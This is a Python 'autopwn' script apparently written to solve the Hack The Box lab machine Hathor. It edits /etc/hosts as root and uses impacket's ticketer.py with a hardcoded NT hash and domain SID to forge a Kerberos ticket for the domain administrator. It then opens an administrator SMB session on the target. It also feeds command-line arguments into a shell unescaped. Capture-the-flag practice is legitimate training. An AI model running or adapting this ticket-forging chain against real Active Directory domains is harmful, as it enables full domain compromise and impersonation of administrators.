import os
import sys
import subprocess
import string
import random
import time

print("\n[\033[1;32m+\033[1;37m] Autopwn Hathor ~ Ninhpn1337\n")
print("\n[\033[1;31m!\033[1;37m] Run as Root please - need to write /etc/hosts file")   

time.sleep(3)

bashfile=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
bashfile='/tmp/'+bashfile+'.sh'

f = open(bashfile, 'w')
s = """sudo -- sh -c -e "echo '10.10.11.147 addr windcorp.htb hathor.windcorp.htb' >> /etc/hosts"
python3 ticketer.py -nthash c639e5b331b0e5034c33dec179dcc792 -domain-sid S-1-5-21-3783586571-2109290616-3725730865 -domain windcorp.htb administrator
export KRB5CCNAME=administrator.ccache
impacket-smbclient -no-pass -k windcorp.htb/administrator@hathor.windcorp.htb -dc-ip hathor.windcorp.htb
"""
f.write(s)
f.close()
os.chmod(bashfile, 0o755)
bashcmd=bashfile
for arg in sys.argv[1:]:
  bashcmd += ' '+arg
subprocess.call(bashcmd, shell=True)
